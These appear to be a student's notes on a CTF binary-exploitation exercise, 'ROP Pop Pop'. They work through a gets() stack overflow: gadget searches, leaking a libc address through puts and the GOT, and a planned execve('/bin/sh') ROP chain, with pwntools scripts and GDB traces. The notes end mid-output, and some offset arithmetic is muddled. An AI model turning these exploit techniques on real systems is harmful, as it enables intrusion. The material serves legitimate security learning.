Downloads: `rop`, `libc-2.31.so`
Points: 200
Flag
Lore:
###### Response:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ ./rop      
Can you pop shell? I took away all the useful tools..
Absolutely!
```
###### Main method that we're getting used to:
```
void main(EVP_PKEY_CTX *param_1)
{
  char data [32];
  
  init(param_1);
  puts("Can you pop shell? I took away all the useful tools..");
  gets(data);
  return;
}
```

Same offsets at 32 and 40

No Pie (so no address randomization?)
```
[*] '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# Finding Gadgets
Can we do the same thing as last time??

hmmm, I'm not seeing `"/bin/sh"` in the program memory anywhere like last time
(Can I put that string on the stack?????)

Ohhhh, but maybe it's in the library:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ strings libc-2.31.so | grep -i "bin/sh"
/bin/sh
```

Located at `0x002b45bd` in `libc-2.31.so`
![[Pasted image 20240310152029.png]]

The thing is, this is all loaded into the stack I think, so I need to figure out the relative address of that string.....

## Finding LibC Base Addr
### Finding Puts:
Puts stub in Ghidra:
![[Pasted image 20240311122306.png]]
`00601018`

And I think this one will be overwritten when puts is actually called?
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ gdb ./rop -q 
gef➤  break puts
Breakpoint 1 at 0x4004c0
gef➤  r

Breakpoint 1, __GI__IO_puts (str=0x4006d8 "Can you pop shell? I took away all the useful tools..") at ./libio/ioputs.c:35

code
   0x7ffff7e40af9                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7e40b00 <puts+0>         push   r14
   0x7ffff7e40b02 <puts+2>         push   r13
   0x7ffff7e40b04 <puts+4>         push   r12

gef➤  x/g 0x00601018
0x601018 <puts@got.plt>:        0x7ffff7e40b00
```

Does this mean that `puts` is always at `0x7ffff7e40b00`....boy I hope so...
	Multiple tests have at least ensured that it is indeed the same address when I do the same thing over and over

#### Libc Base Address and System Address:
```python
libcBase = 0
sysAddr = 0
binshAddr = 0
def setLibAddrs():
	p = process('./rop')
	libc = ELF('./libc-2.31.so')

	putsAddr = 0x7ffff7e40b00

	libcBase = putsAddr - libc.symbols['puts']
	print(hex(libcBase))

	sysAddr = libcBase + libc.symbols['system']
	print(hex(sysAddr))

	binshAddr = libcBase + 0x002b45bd
	print(hex(binshAddr))
	return 0

┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_1.py
[+] Starting local process './rop': pid 894915
[*] '/home/kali/Desktop/6-Week/ROP-Pop-Pop/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
0x7ffff7dbc6e0
0x7ffff7e0e970
0x7ffff8070c9d
[*] Stopped process './rop' (pid 894915)
```

So now that we (allegedly) have the addresses of `syscall` and `"/bin/sh"` in libc... I think we can find the other gadgets like normal?
##### Gadget A `pop rdi`
This one just does what it's supposed to
```
0x00000000004006b3 : pop rdi ; ret
```
##### Gadget B `pop rsi`
This one has an extra step, but is still pretty straightforward
```
0x00000000004006b1 : pop rsi ; pop r15 ; ret
```
Will need to put junk data before return address to put in `r15`
##### Gadget C: Putting data in `rdx`
She's gonna have to be in the library too :(
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ ROPgadget --binary libc-2.31.so| grep -e "pop rdx.*ret"

0x0000000000119431 : pop rdx ; pop r12 ; ret
```
This one will also need junk data before the ret address
##### Gadget D: Putting data in `rax`
This one is also in libc, but at least it doesn't require anything extra
```
0x0000000000036174 : pop rax ; ret
```


Here is where that actual syscall is:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ ROPgadget --binary libc-2.31.so| grep -e ": syscall"
0x000000000002284d : syscall
```
Of course that ends up calculating a different address...lol
##### Gadget F: Plain Return: (in rop)
```
0x00000000004004a9 : ret
```
I don't actually know if we need this one

Here's what the stack should look like:
```
  retAddr(main) --> Addr(A)     // pop rdi ; ret
		 rsp(A) --> datA        // --> "/bin/sh"
     retAddr(A) --> Addr(B)     // pop rsi ; pop r15 ; ret
		 rsp(B) --> 0x00
		            0xdeadbeef
     retAddr(B) --> Addr(C)     // pop rdx ; pop r12 ; ret
		 rsp(C) --> 0x00
					0xdeadbeef
     retAddr(C) --> Addr(D)     // pop rax ; ret
		 rsp(D) --> 0x3b        // execve
     retAddr(D) --> Addr(E)     // syscall
   retAddr(sys) --> Addr(F)     // ret
```

# Leaking addr using puts?
###### `puts` in GOT
![[Pasted image 20240311152537.png]]

So step 1 is using puts to leak the real address of `puts`
Put `00601018` on top of the stack

`puts` takes a single argument, which is a pointer to a string
I think if I give it the address `00601018`, it will tell us the real (loaded) address of `puts`

So first I need something that will move that into RDI, luckily, I have my gadget already:
```
0x00000000004006b3 : pop rdi ; ret
```
So our stack will have to be:
```
  retAddr(main) --> 0x4006b3    // Addr(A) --> pop rdi ; ret
		 rsp(A) --> 00601018    // Addr(puts)
     retAddr(A) --> 00601018    // Addr(puts)
```


I was getting a segfault since it tried to jump to the next thing in the stack after the return so I got lazy and had it run the same thing a second time to avoid that...

```python
def leakPuts():
	context.binary = binary = ELF("./rop", checksec=False)
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotPuts = p64(binary.got.puts)		# Address to leak

	#pad = 
	#p = process()

	pld = cyclic(40)
	pld += popRDI + gotPuts + pltPuts
	pld += popRDI + gotPuts + pltPuts
	return pld
```
###### GDB
```
──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
[+] Starting local process '/bin/bash': pid 1009053
[#0] Id 1, Name: "rop", stopped 0x40064a in main (), reason: BREAKPOINT
 trace ────
[#0] 0x40064a → main()

gef➤  $ break puts
Breakpoint 2 at 0x7ffff7e40b00: file ./libio/ioputs.c, line 35.
gef➤  $ c
Continuing.

Id 1, Name: "rop", stopped 0x7ffff7e40b00 in __GI__IO_puts (), reason: BREAKPOINT
trace ────
[#0] 0x7ffff7e40b00 → __GI__IO_puts(str=0x601018 <puts@got[plt]> "")
[#1] 0x4006b3 → __libc_csu_init()
[#2] 0x4004c0 →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
[#3] 0x7fffffffdeb8 → rex.W loop 0x7fffffffdeba

gef➤  $ c
Continuing.

```


Hmmm, it's still not printing the data out...

Oh heck, it's breaking because we overwrote the `rsp` value ...lol
```
[#1] 0x7ffff7e40bcf → __GI__IO_puts(str=0x6161616a61616169 <error: Cannot access memory at address 0x6161616a61616169>)
```

Oh, so my base pointer is supposed to point to that 00001 at some point haha
Right before `gets`:
```
$rbp   : 0x00007fffffffdd90  →  0x0000000000000001
```

This is, at least, a valid value?


Shoving that in there gets us to the end of `puts` without a segfault but...it still is only printing new lines


```
gef➤  p syscall
$2 = {void (void)} 0x7ffff7ecbed0 <syscall>

      0x7ffff7dcb000     0x7ffff7df1000    0x26000        0x0  r--p   /libc.so.6
      0x7ffff7df1000     0x7ffff7f46000   0x155000    0x26000  r-xp   /libc.so.6
      0x7ffff7f46000     0x7ffff7f9a000    0x54000   0x17b000  r--p   /libc.so.6
      0x7ffff7f9a000     0x7ffff7f9e000     0x4000   0x1cf000  r--p   /libc.so.6
      0x7ffff7f9e000     0x7ffff7fa0000     0x2000   0x1d3000  rw-p   /libc.so.6

┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ strings -tx libc-2.31.so| grep "bin/sh"
 1b45bd /bin/sh

7ffff7dcb000 + 1b45bd = 7FFFF7F7F5BD
```


```
gef➤  p puts
$1 = {int (const char *)} 0x7ffff7e40b00 <__GI__IO_puts>
```













Leak Script:
```python
def leakPuts():
	binary = context.binary = ELF('./rop', checksec=False)
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotPuts = p64(binary.got.puts)		# Address to leak


	print(hex(binary.plt.puts))
	print(hex(binary.got.puts))

	p = process()

	pld = cyclic(40)

	pld += popRDI + gotPuts + pltPuts
	# return pld
	
	p.send(pld)
	p.interactive()
	cf = p.corefile
```
Output:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
0x4004c0
0x601018
[+] Starting local process '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop': pid 21297
[*] Switching to interactive mode
Can you pop shell? I took away all the useful tools..
$ 

[*] Got EOF while reading in interactive
$ 
[*] Process '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop' stopped with exit code -11 (SIGSEGV) (pid 21297)
[*] Got EOF while sending in interactive
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/6-Week/ROP-Pop-Pop/core.21297'
    Arch:      amd64-64-little
    RIP:       0x100000000
    RSP:       0x7fffd6885d98
    Exe:       '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop' (0x400000)
    Fault:     0x100000000
```

When sending the same payload to rop running with gdb, I see the values as expected in the stack and it looks like the code will jump to my pop RDI gadget once main returns:
```
stack ────
0x00007fffffffdd98│+0x0000: 0x00000000004006b3  →  <__libc_csu_init+99> pop rdi     ← $rsp
0x00007fffffffdda0│+0x0008: 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
0x00007fffffffdda8│+0x0010: 0x00000000004004c0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
0x00007fffffffddb0│+0x0018: 0x0000000100000000

code:x86:64 ────
 →   0x40064a <main+41>        ret    
   ↳    0x4006b3 <__libc_csu_init+99> pop    rdi
        0x4006b4 <__libc_csu_init+100> ret    
```
But eventually I get a segmentation error 



```
usr/lib/x86_64-linux-gnu/libc.so.6
```


I think I need to call `ret` before I jump to my other stuff to leak the address
```
0x00000000004004a9 : ret
```



Hello,
I'm stuck on part of ROP Pop Pop.
I'm currently attempting to leak the address of puts in the program stack so I can use it to calculate the base address of libc.
Currently my leak script causes the program to segfault after puts returns, which makes sense because my current payload doesn't include an address to jump to when puts returns. However, I'm surprised to see that it doesn't print out anything at all before the error.
Here is the script I'm using to leak the addresses:
```python
def leakPuts():
	binary = context.binary = ELF('./rop', checksec=False)
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotPuts = p64(binary.got.puts)		# Address to leak


	print(hex(binary.plt.puts))
	print(hex(binary.got.puts))

	p = process()

	pld = cyclic(40)
	pld += retGdgt + popRDI + gotPuts + pltPuts
	return pld
	
def testLeak():
	p = process('/bin/bash')
	p.sendline('gdb ./rop -q')
	p.sendline("break *0x0040064a") # Break at ret in main
	p.recv()
	p.clean(timeout=0.05)
	p.sendline("r")
	p.recvuntil("tools..")
	p.sendline(leakPuts())
	p.interactive()

def localLeak():
	p = process("./rop")
	p.recvuntil("tools..")
	p.sendline(leakPuts())
	#while True:
		#print(cleanLine(p.recvline()))
	p.interactive()
```

This is what the output looks like when I run `localLeak()`
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
[+] Starting local process './rop': pid 102415
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_2.py:84: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
0x4004c0
0x601018
[+] Starting local process '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop': pid 102417
[*] Switching to interactive mode


[*] Got EOF while reading in interactive
$ 
[*] Process './rop' stopped with exit code -11 (SIGSEGV) (pid 102415)
[*] Got EOF while sending in interactive
[*] Stopped process '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop' (pid 102417)
```

I get more information running it in a GDB session:
At the breakpoint right before `main` returns, the register values are as expected (though I assume overwriting `rbp` like that will mess me up eventually). 
We can see the payload data in the stack and we can see that after `main` returns it will jump to my `ret` gadget at `0x4004a9`
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
 p.recvuntil("tools..")
0x4004c0
0x601018
[+] Starting local process '/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop': pid 98993
[*] Switching to interactive mode


Breakpoint 1, 0x000000000040064a in main ()
registers ────
$rax   : 0x00007fffffffdd70  →  0x6161616261616161 ("aaaabaaa"?)
$rbx   : 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffdd98  →  0x00000000004004a9  →  <_init+25> ret 
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x000000000040064a  →  <main+41> ret 
$r8    : 0x00000000006022e9  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdeb8  →  0x00007fffffffe248  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

stack ────
0x00007fffffffdd98│+0x0000: 0x00000000004004a9  →  <_init+25> ret      ← $rsp
0x00007fffffffdda0│+0x0008: 0x00000000004006b3  →  <__libc_csu_init+99> pop rdi
0x00007fffffffdda8│+0x0010: 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
0x00007fffffffddb0│+0x0018: 0x00000000004004c0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
0x00007fffffffddb8│+0x0020: 0x00007fffffffde00  →  0x0000000000000000
0x00007fffffffddc0│+0x0028: 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"

code:x86:64 ────
     0x400641 <main+32>        mov    rdi, rax
     0x400644 <main+35>        call   0x4004f0 <gets@plt>
     0x400649 <main+40>        leave  
 →   0x40064a <main+41>        ret    
   ↳    0x4004a9 <_init+25>       ret    
        0x4004aa                  add    BYTE PTR [rax], al
```

After I continue, the program segfaults:
It looks like `0x00007fffffffde00` was at the top of the stack when the program returned, which did not point to valid instructions
```
gef➤  $ c
Continuing.


Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffde00 in ?? ()

registers ────
$rax   : 0x1               
$rbx   : 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffddc0  →  0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x00007fffffffde00  →  0x0000000000000000
$r8    : 0x00000000006022e9  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdeb8  →  0x00007fffffffe248  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

stack ────
0x00007fffffffddc0│+0x0000: 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"     ← $rsp
0x00007fffffffddc8│+0x0008: 0x06d2edb3e0e41585
0x00007fffffffddd0│+0x0010: 0x0000000000000000
0x00007fffffffddd8│+0x0018: 0x00007fffffffdeb8  →  0x00007fffffffe248  →  "SHELL=/usr/bin/zsh"

code:x86:64 ────
 → 0x7fffffffde00                  add    BYTE PTR [rax], al
```

Can you tell what I'm doing wrong to prevent the library values from printing properly?


And here's more debugging data if it helps:
Here's what everything looks like at that first `ret` gadget:
We can see the pop rdi gadget at the top of the stack and in the upcoming instructions
```
gef➤  $ break *0x4004a9
Breakpoint 2 at 0x4004a9
gef➤  $ c
Continuing.
Breakpoint 2, 0x00000000004004a9 in _init ()

registers ────
$rax   : 0x00007fffffffdd70  →  0x6161616261616161 ("aaaabaaa"?)
$rbx   : 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffdda0  →  0x00000000004006b3  →  <__libc_csu_init+99> pop rdi
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x00000000004004a9  →  <_init+25> ret 
$r8    : 0x00000000006022e9  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdeb8  →  0x00007fffffffe248  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

stack ────
0x00007fffffffdda0│+0x0000: 0x00000000004006b3  →  <__libc_csu_init+99> pop rdi     ← $rsp
0x00007fffffffdda8│+0x0008: 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
0x00007fffffffddb0│+0x0010: 0x00000000004004c0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
0x00007fffffffddb8│+0x0018: 0x00007fffffffde00  →  0x0000000000000000

code:x86:64 ────
     0x40049e <_init+14>       je     0x4004a5 <_init+21>
     0x4004a0 <_init+16>       call   0x4004e0 <__gmon_start__@plt>
     0x4004a5 <_init+21>       add    rsp, 0x8
●→   0x4004a9 <_init+25>       ret    
   ↳    0x4006b3 <__libc_csu_init+99> pop    rdi
        0x4006b4 <__libc_csu_init+100> ret    
```

And here is what everything looks like right before the `pop rdi` gadget returns:
The next item on the stack is the call to puts:
```
gef➤  $ break *0x4006b4
Breakpoint 3 at 0x4006b4
gef➤  $ c
Continuing.

Breakpoint 3, 0x00000000004006b4 in __libc_csu_init ()
registers ────
$rax   : 0x00007fffffffdd70  →  0x6161616261616161 ("aaaabaaa"?)
$rbx   : 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffddb0  →  0x00000000004004c0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
$rip   : 0x00000000004006b4  →  <__libc_csu_init+100> ret 
$r8    : 0x00000000006022e9  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdeb8  →  0x00007fffffffe248  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

stack ────
0x00007fffffffddb0│+0x0000: 0x00000000004004c0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>     ← $rsp
0x00007fffffffddb8│+0x0008: 0x00007fffffffde00  →  0x0000000000000000
0x00007fffffffddc0│+0x0010: 0x00007fffffffdea8  →  0x00007fffffffe21e  →  "/home/kali/Desktop/6-Week/ROP-Pop-Pop/rop"

code:x86:64 ────
     0x4006ae <__libc_csu_init+94> pop    r13
     0x4006b0 <__libc_csu_init+96> pop    r14
     0x4006b2 <__libc_csu_init+98> pop    r15
●→   0x4006b4 <__libc_csu_init+100> ret    
   ↳    0x4004c0 <puts@plt+0>     jmp    QWORD PTR [rip+0x200b52]        # 0x601018 <puts@got.plt>
        0x4004c6 <puts@plt+6>     push   0x0
        0x4004cb <puts@plt+11>    jmp    0x4004b0

gef➤  $ x/i 0x4004b0
   0x4004b0:    push   QWORD PTR [rip+0x200b52]        # 0x601008
gef➤  $ x/2x 0x601008
0x601008:    0xf7ffe2d0    0x00007fff
```



Looks like it is recieving a new line:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
[+] Starting local process './rop': pid 129568
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_2.py:86: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[DEBUG] Received 0x36 bytes:
    b'Can you pop shell? I took away all the useful tools..\n'
0x4004c0
0x601018
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  a9 04 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  b3 06 40 00  00 00 00 00  18 10 60 00  00 00 00 00  │··@·│····│··`·│····│
    00000040  c0 04 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000049
[*] Switching to interactive mode

[DEBUG] Received 0x1 bytes:
    b'\n'

[*] Got EOF while reading in interactive

```


```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 5
[0x601018] puts@GLIBC_2.2.5  →  0x7ffff7e40b00
```

0x 7f 72 d8 3e 80 50
0x a 7f 72 d8 3e 80 50
0x a 00 00 00 00 00 00

0x7f9544ec7050


```python
def leakPuts():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	#pltPuts = p64(binary.plt.puts)		# Address to call
	pltPuts = p64(0x4004c0)
	#pltPuts = p64(0x00400638)
	#gotPuts = p64(binary.got.puts)		# Address to leak
	gotGets = p64(binary.got.gets)

	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	return pld

def localLeak():
	p = process("./rop")
	context.log_level = 'debug'
	p.recvuntil("tools..")
	p.sendline(leakPuts())
	#while True:
		#print(cleanLine(p.recvline()))
	p.interactive()
```

```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
[+] Starting local process './rop': pid 4120
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_2.py:97: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[DEBUG] Received 0x36 bytes:
    b'Can you pop shell? I took away all the useful tools..\n'
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  a9 04 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  b3 06 40 00  00 00 00 00  30 10 60 00  00 00 00 00  │··@·│····│0·`·│····│
    00000040  c0 04 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000049
[*] Switching to interactive mode

[*] Process './rop' stopped with exit code -11 (SIGSEGV) (pid 4120)
[DEBUG] Received 0x7 bytes:
    00000000  50 e0 7b 2d  d0 7f 0a                               │P·{-│···│
    00000007
P\xe0{-\xd0
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Got EOF while sending in interactive
                                            
```




```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_2.py
[+] Starting local process '/bin/bash': pid 13737
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] PÀÂ,Q\x7f
[*] puts leak - 0xa7f512cc2c050
[*] Switching to interactive mode

gef➤  $ x /10xg 0x601000
0x601000:    0x0000000000600e28    0x00007f512cde42d0
0x601010:    0x00007f512cdc3300    0x00007f512cc2cb00
0x601020 <__libc_start_main@got.plt>:    0x00007f512cbde700    0x00000000004004e6
0x601030 <gets@got.plt>:    0x00007f512cc2c050    0x00007f512cc2d2e0
0x601040:    0x0000000000000000    0x0000000000000000

```

```python
def leakPuts():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(0x4004c0)
	gotGets = p64(binary.got.gets)

	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	return pld

def testLeak():
	p = process('/bin/bash')
	p.sendline('gdb ./rop -q')
	p.sendline("set disable-randomization off")
	#p.sendline("break *0x0040064a") # Break at ret in main
	p.recv()
	p.clean(timeout=0.05)
	p.sendline("r")
	p.recvuntil("tools..")
	p.sendline(leakPuts())
	p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	log.info("puts leak - " + hex(leak))
	p.interactive()
```


```
0x00007ffff7dcb000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7df1000 0x00007ffff7f46000 0x0000000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f46000 0x00007ffff7f9a000 0x000000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9a000 0x00007ffff7f9e000 0x00000000001cf000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d3000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
```



# `/bin/sh` Strings
#### Local LibC  `libc.so.6`
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ strings -tx /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -i "/bin"
 0x0029604f /bin/sh
```

![[Pasted image 20240313112959.png]]
```
0x0029604f
offset = 0x0019604f
```

I think that offset from above is more important

LibC "base" (in it's own memory, NOT on the stack)
```
0x0029604f - 0x0x0029604f = 0x100000
```
#### One for remote? `libc-2.31.so`
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ strings -tx libc-2.31.so | grep -i "/bin" 
 1b45bd /bin/sh
 1b5ab9 /bin:/usr/bin
 1b5f24 /bin/csh
 1b77ae /etc/bindresvport.blacklist
 1ba798 /bin:/usr/bin
```
![[Pasted image 20240313113104.png]]
```
0x002b45bd
```
And that's another offset that has the base being 0x100000
# Offset of `read` and `syscall`
#### Local LibC  `libc.so.6`
##### `read` offset
![[Pasted image 20240313113959.png]]
The lib starts at 0x100000
Read offset = `0xf7a50`
##### `syscall` offset
![[Pasted image 20240313114304.png]]
At: `0x00200ed0`
Offset from base LibC = `0x00100ed0`

#### Remote `libc-2.31.so`
##### `read` offset
![[Pasted image 20240313114544.png]]
Adr: `0x0020e1e0`
Offset: `0x0010e1e0`
##### `syscall` offset
![[Pasted image 20240313114801.png]]
Addr: `0x00218940`
Offset: `0x00118940`



# How do I even use my leak?!?!?!?!
I can have it jump BACK to the beginning once it leaks !!!!

Testing this now:
###### Mainline
```python
def mainLinePld():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotGets = p64(binary.got.gets)

	mainAddr = p64(0x00400621)			# Address of first line in main


	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	pld += mainAddr
	return pld


def mainline(p):
	i = 0
	while i < 3:
		p.recvuntil("tools..")
		p.sendline(mainLinePld())
		p.recvline()
		addr = p.recvline()
		log.info(addr)
		leak = u64(addr.ljust(8, b'\x00'))
		log.info("puts leak - " + hex(leak))
		i+=1
	p.interactive()
	
def localMainline():
	p = process("./rop")
	context.log_level = 'debug'
	mainline(p)
```
###### We can see the same address in the results
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_3.py
[+] Starting local process './rop': pid 116179
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:118: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[DEBUG] Received 0x36 bytes:
    b'Can you pop shell? I took away all the useful tools..\n'
[DEBUG] Sent 0x51 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
